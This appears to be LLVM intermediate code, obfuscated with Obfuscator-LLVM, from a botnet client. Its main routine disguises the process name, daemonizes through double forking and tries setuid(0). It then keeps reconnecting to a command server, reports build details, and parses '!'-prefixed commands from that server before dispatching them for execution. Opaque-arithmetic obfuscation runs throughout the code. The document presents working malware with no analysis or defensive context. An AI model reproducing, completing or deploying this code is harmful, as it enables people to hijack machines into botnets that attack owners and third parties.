  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.563, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.564, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.570, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, -1
  %40 = and i64 %38, %39
  %41 = xor i64 %38, -1
  %42 = and i64 %36, %41
  %43 = or i64 %40, %42
  %44 = xor i64 %36, %38
  %45 = trunc i64 %43 to i32
  call void @srand(i32 %45) #5
  %46 = call i64 @time(i64* null) #5
  %47 = call i32 @getpid() #5
  %48 = sext i32 %47 to i64
  %49 = xor i64 %46, -1
  %50 = and i64 -8036997250543558291, %49
  %51 = xor i64 -8036997250543558291, -1
  %52 = and i64 %46, %51
  %53 = xor i64 %48, -1
  %54 = and i64 %53, -8036997250543558291
  %55 = and i64 %48, %51
  %56 = or i64 %50, %52
  %57 = or i64 %54, %55
  %58 = xor i64 %56, %57
  %59 = xor i64 %46, %48
  %60 = trunc i64 %58 to i32
  call void @init_rand(i32 %60)
  %61 = call i32 @fork() #5
  store i32 %61, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %2
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %2
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %80, label %69

; <label>:69:                                     ; preds = %66
  %70 = call i32 @fork() #5
  store i32 %70, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %8, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

; <label>:76:                                     ; preds = %73
  br label %78

; <label>:77:                                     ; preds = %73
  br label %78

; <label>:78:                                     ; preds = %77, %76
  br label %79

; <label>:79:                                     ; preds = %78
  br label %81

; <label>:80:                                     ; preds = %66
  br label %81

; <label>:81:                                     ; preds = %80, %79
  br label %82

; <label>:82:                                     ; preds = %81
  %83 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.571, i32 0, i32 0)) #5
  %84 = call i32 @setuid(i32 0) #5
  %85 = call i32 @seteuid(i32 0) #5
  %86 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %87

; <label>:87:                                     ; preds = %93, %82
  %88 = call i32 @fork() #5
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %399

; <label>:90:                                     ; preds = %87
  %91 = call i32 @initConnection()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %90
  %94 = call i32 @sleep(i32 5)
  br label %87

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i8* @getBuild()
  %98 = call i32 @getEndianness()
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.572, i32 0, i32 0), i8* %97, i32 %98)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %100

; <label>:100:                                    ; preds = %397, %249, %213, %95
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %103 = call i32 @recvLine(i32 %101, i8* %102, i32 4096)
  store i32 %103, i32* %11, align 4
  %104 = icmp ne i32 %103, -1
  br i1 %104, label %105, label %398

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %12, align 4
  br label %106

; <label>:106:                                    ; preds = %198, %105
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = load i64, i64* @numpids, align 8
  %110 = icmp ult i64 %108, %109
  br i1 %110, label %111, label %204

; <label>:111:                                    ; preds = %106
  %112 = load i32*, i32** @pids, align 8
  %113 = load i32, i32* %12, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @waitpid(i32 %116, i32* null, i32 1)
  %118 = icmp sgt i32 %117, 0
  br i1 %118, label %119, label %197

; <label>:119:                                    ; preds = %111
  %120 = load i32, i32* %12, align 4
  %121 = sub i32 0, %120
  %122 = sub i32 0, 1
  %123 = add i32 %121, %122
  %124 = sub i32 0, %123
  %125 = add nsw i32 %120, 1
  store i32 %124, i32* %14, align 4
  br label %126

; <label>:126:                                    ; preds = %145, %119
  %127 = load i32, i32* %14, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  br i1 %130, label %131, label %151

; <label>:131:                                    ; preds = %126
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = sub i32 %138, -1597270903
  %140 = sub i32 %139, 1
  %141 = add i32 %140, -1597270903
  %142 = sub i32 %138, 1
  %143 = zext i32 %141 to i64
  %144 = getelementptr inbounds i32, i32* %137, i64 %143
  store i32 %136, i32* %144, align 4
  br label %145

; <label>:145:                                    ; preds = %131
  %146 = load i32, i32* %14, align 4
  %147 = sub i32 %146, -1696752305
  %148 = add i32 %147, 1
  %149 = add i32 %148, -1696752305
  %150 = add i32 %146, 1
  store i32 %149, i32* %14, align 4
  br label %126

; <label>:151:                                    ; preds = %126
  %152 = load i32*, i32** @pids, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sub i32 0, 1
  %155 = add i32 %153, %154
  %156 = sub i32 %153, 1
  %157 = zext i32 %155 to i64
  %158 = getelementptr inbounds i32, i32* %152, i64 %157
  store i32 0, i32* %158, align 4
  %159 = load i64, i64* @numpids, align 8
  %160 = sub i64 %159, -5909106440949095543
  %161 = add i64 %160, -1
  %162 = add i64 %161, -5909106440949095543
  %163 = add i64 %159, -1
  store i64 %162, i64* @numpids, align 8
  %164 = load i64, i64* @numpids, align 8
  %165 = add i64 %164, 619961861533546637
  %166 = add i64 %165, 1
  %167 = sub i64 %166, 619961861533546637
  %168 = add i64 %164, 1
  %169 = mul i64 %167, 4
  %170 = call noalias i8* @malloc(i64 %169) #5
  %171 = bitcast i8* %170 to i32*
  store i32* %171, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %172

; <label>:172:                                    ; preds = %187, %151
  %173 = load i32, i32* %14, align 4
  %174 = zext i32 %173 to i64
  %175 = load i64, i64* @numpids, align 8
  %176 = icmp ult i64 %174, %175
  br i1 %176, label %177, label %193

; <label>:177:                                    ; preds = %172
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %14, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds i32, i32* %178, i64 %180
  %182 = load i32, i32* %181, align 4
  %183 = load i32*, i32** %13, align 8
  %184 = load i32, i32* %14, align 4
  %185 = zext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  store i32 %182, i32* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %177
  %188 = load i32, i32* %14, align 4
  %189 = add i32 %188, 155374513
  %190 = add i32 %189, 1
  %191 = sub i32 %190, 155374513
  %192 = add i32 %188, 1
  store i32 %191, i32* %14, align 4
  br label %172

; <label>:193:                                    ; preds = %172
  %194 = load i32*, i32** @pids, align 8
  %195 = bitcast i32* %194 to i8*
  call void @free(i8* %195) #5
  %196 = load i32*, i32** %13, align 8
  store i32* %196, i32** @pids, align 8
  br label %197

; <label>:197:                                    ; preds = %193, %111
  br label %198

; <label>:198:                                    ; preds = %197
  %199 = load i32, i32* %12, align 4
  %200 = add i32 %199, -1747872064
  %201 = add i32 %200, 1
  %202 = sub i32 %201, -1747872064
  %203 = add nsw i32 %199, 1
  store i32 %202, i32* %12, align 4
  br label %106

; <label>:204:                                    ; preds = %106
  %205 = load i32, i32* %11, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %206
  store i8 0, i8* %207, align 1
  %208 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %208)
  %209 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %210 = call i8* @strstr(i8* %209, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %212 = icmp eq i8* %210, %211
  br i1 %212, label %213, label %214

; <label>:213:                                    ; preds = %204
  br label %100

; <label>:214:                                    ; preds = %204
  %215 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %216 = call i8* @strstr(i8* %215, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.573, i32 0, i32 0)) #9
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %218 = icmp eq i8* %216, %217
  br i1 %218, label %219, label %220

; <label>:219:                                    ; preds = %214
  call void @exit(i32 0) #12
  unreachable

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %221, i8** %15, align 8
  %222 = load i8*, i8** %15, align 8
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 33
  br i1 %225, label %226, label %397

; <label>:226:                                    ; preds = %220
  %227 = load i8*, i8** %15, align 8
  %228 = getelementptr inbounds i8, i8* %227, i64 1
  store i8* %228, i8** %16, align 8
  br label %229

; <label>:229:                                    ; preds = %241, %226
  %230 = load i8*, i8** %16, align 8
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp ne i32 %232, 32
  br i1 %233, label %234, label %239

; <label>:234:                                    ; preds = %229
  %235 = load i8*, i8** %16, align 8
  %236 = load i8, i8* %235, align 1
  %237 = zext i8 %236 to i32
  %238 = icmp ne i32 %237, 0
  br label %239

; <label>:239:                                    ; preds = %234, %229
  %240 = phi i1 [ false, %229 ], [ %238, %234 ]
  br i1 %240, label %241, label %244

; <label>:241:                                    ; preds = %239
  %242 = load i8*, i8** %16, align 8
  %243 = getelementptr inbounds i8, i8* %242, i32 1
  store i8* %243, i8** %16, align 8
  br label %229

; <label>:244:                                    ; preds = %239
  %245 = load i8*, i8** %16, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 0
  br i1 %248, label %249, label %250

; <label>:249:                                    ; preds = %244
  br label %100

; <label>:250:                                    ; preds = %244
  %251 = load i8*, i8** %16, align 8
  store i8 0, i8* %251, align 1
  %252 = load i8*, i8** %15, align 8
  %253 = getelementptr inbounds i8, i8* %252, i64 1
  store i8* %253, i8** %16, align 8
  %254 = load i8*, i8** %15, align 8
  %255 = load i8*, i8** %16, align 8
  %256 = call i64 @strlen(i8* %255) #9
  %257 = getelementptr inbounds i8, i8* %254, i64 %256
  %258 = getelementptr inbounds i8, i8* %257, i64 2
  store i8* %258, i8** %15, align 8
  br label %259

; <label>:259:                                    ; preds = %285, %250
  %260 = load i8*, i8** %15, align 8
  %261 = load i8*, i8** %15, align 8
  %262 = call i64 @strlen(i8* %261) #9
  %263 = sub i64 %262, 7375238929689450298
  %264 = sub i64 %263, 1
  %265 = add i64 %264, 7375238929689450298
  %266 = sub i64 %262, 1
  %267 = getelementptr inbounds i8, i8* %260, i64 %265
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i32
  %270 = icmp eq i32 %269, 10
  br i1 %270, label %283, label %271

; <label>:271:                                    ; preds = %259
  %272 = load i8*, i8** %15, align 8
  %273 = load i8*, i8** %15, align 8
  %274 = call i64 @strlen(i8* %273) #9
  %275 = sub i64 %274, -3850766153139942770
  %276 = sub i64 %275, 1
  %277 = add i64 %276, -3850766153139942770
  %278 = sub i64 %274, 1
  %279 = getelementptr inbounds i8, i8* %272, i64 %277
  %280 = load i8, i8* %279, align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 13
  br label %283

; <label>:283:                                    ; preds = %271, %259
  %284 = phi i1 [ true, %259 ], [ %282, %271 ]
  br i1 %284, label %285, label %294

; <label>:285:                                    ; preds = %283
  %286 = load i8*, i8** %15, align 8
  %287 = load i8*, i8** %15, align 8
  %288 = call i64 @strlen(i8* %287) #9
  %289 = sub i64 %288, -5607108528537041284
  %290 = sub i64 %289, 1
  %291 = add i64 %290, -5607108528537041284
  %292 = sub i64 %288, 1
  %293 = getelementptr inbounds i8, i8* %286, i64 %291
  store i8 0, i8* %293, align 1
  br label %259

; <label>:294:                                    ; preds = %283
  %295 = load i8*, i8** %15, align 8
  store i8* %295, i8** %17, align 8
  br label %296

; <label>:296:                                    ; preds = %308, %294
  %297 = load i8*, i8** %15, align 8
  %298 = load i8, i8* %297, align 1
  %299 = zext i8 %298 to i32
  %300 = icmp ne i32 %299, 32
  br i1 %300, label %301, label %306

; <label>:301:                                    ; preds = %296
  %302 = load i8*, i8** %15, align 8
  %303 = load i8, i8* %302, align 1
  %304 = zext i8 %303 to i32
  %305 = icmp ne i32 %304, 0
  br label %306

; <label>:306:                                    ; preds = %301, %296
  %307 = phi i1 [ false, %296 ], [ %305, %301 ]
  br i1 %307, label %308, label %311

; <label>:308:                                    ; preds = %306
  %309 = load i8*, i8** %15, align 8
  %310 = getelementptr inbounds i8, i8* %309, i32 1
  store i8* %310, i8** %15, align 8
  br label %296

; <label>:311:                                    ; preds = %306
  %312 = load i8*, i8** %15, align 8
  store i8 0, i8* %312, align 1
  %313 = load i8*, i8** %15, align 8
  %314 = getelementptr inbounds i8, i8* %313, i32 1
  store i8* %314, i8** %15, align 8
  %315 = load i8*, i8** %17, align 8
  store i8* %315, i8** %18, align 8
  br label %316

; <label>:316:                                    ; preds = %320, %311
  %317 = load i8*, i8** %18, align 8
  %318 = load i8, i8* %317, align 1
  %319 = icmp ne i8 %318, 0
  br i1 %319, label %320, label %329

; <label>:320:                                    ; preds = %316
  %321 = load i8*, i8** %18, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = call i32 @toupper(i32 %323) #9
  %325 = trunc i32 %324 to i8
  %326 = load i8*, i8** %18, align 8
  store i8 %325, i8* %326, align 1
  %327 = load i8*, i8** %18, align 8
  %328 = getelementptr inbounds i8, i8* %327, i32 1
  store i8* %328, i8** %18, align 8
  br label %316

; <label>:329:                                    ; preds = %316
  store i32 1, i32* %20, align 4
  %330 = load i8*, i8** %15, align 8
  %331 = call i8* @strtok(i8* %330, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %331, i8** %21, align 8
  %332 = load i8*, i8** %17, align 8
  %333 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 0
  store i8* %332, i8** %333, align 16
  br label %334

; <label>:334:                                    ; preds = %373, %329
  %335 = load i8*, i8** %21, align 8
  %336 = icmp ne i8* %335, null
  br i1 %336, label %337, label %375

; <label>:337:                                    ; preds = %334
  %338 = load i8*, i8** %21, align 8
  %339 = load i8, i8* %338, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp ne i32 %340, 10
  br i1 %341, label %342, label %373

; <label>:342:                                    ; preds = %337
  %343 = load i8*, i8** %21, align 8
  %344 = call i64 @strlen(i8* %343) #9
  %345 = sub i64 %344, -7552104833584995740
  %346 = add i64 %345, 1
  %347 = add i64 %346, -7552104833584995740
  %348 = add i64 %344, 1
  %349 = call noalias i8* @malloc(i64 %347) #5
  %350 = load i32, i32* %20, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %351
  store i8* %349, i8** %352, align 8
  %353 = load i32, i32* %20, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %354
  %356 = load i8*, i8** %355, align 8
  %357 = load i8*, i8** %21, align 8
  %358 = call i64 @strlen(i8* %357) #9
  %359 = sub i64 %358, 5366968614530948840
  %360 = add i64 %359, 1
  %361 = add i64 %360, 5366968614530948840
  %362 = add i64 %358, 1
  call void @llvm.memset.p0i8.i64(i8* %356, i8 0, i64 %361, i32 1, i1 false)
  %363 = load i32, i32* %20, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = load i8*, i8** %21, align 8
  %368 = call i8* @strcpy(i8* %366, i8* %367) #5
  %369 = load i32, i32* %20, align 4
  %370 = sub i32 0, 1
  %371 = sub i32 %369, %370
  %372 = add nsw i32 %369, 1
  store i32 %371, i32* %20, align 4
  br label %373

; <label>:373:                                    ; preds = %342, %337
  %374 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.574, i32 0, i32 0)) #5
  store i8* %374, i8** %21, align 8
  br label %334

; <label>:375:                                    ; preds = %334
  %376 = load i32, i32* %20, align 4
  %377 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %376, i8** %377)
  %378 = load i32, i32* %20, align 4
  %379 = icmp sgt i32 %378, 1
  br i1 %379, label %380, label %396

; <label>:380:                                    ; preds = %375
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %381

; <label>:381:                                    ; preds = %390, %380
  %382 = load i32, i32* %22, align 4
  %383 = load i32, i32* %20, align 4
  %384 = icmp slt i32 %382, %383
  br i1 %384, label %385, label %395

; <label>:385:                                    ; preds = %381
  %386 = load i32, i32* %22, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %387
  %389 = load i8*, i8** %388, align 8
  call void @free(i8* %389) #5
  br label %390

; <label>:390:                                    ; preds = %385
  %391 = load i32, i32* %22, align 4
  %392 = sub i32 0, 1
  %393 = sub i32 %391, %392
  %394 = add nsw i32 %391, 1
  store i32 %393, i32* %22, align 4
  br label %381

; <label>:395:                                    ; preds = %381
  br label %396

; <label>:396:                                    ; preds = %395, %375
  br label %397

; <label>:397:                                    ; preds = %396, %220
  br label %100

; <label>:398:                                    ; preds = %100
  br label %399

; <label>:399:                                    ; preds = %398, %87
  ret i32 0
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146506763}
!2 = !{i32 -2146505635}
!3 = !{i32 -2146504944}
!4 = !{i32 -2146504195}
!5 = !{i32 -2146503256}
!6 = !{i32 -2146502167}
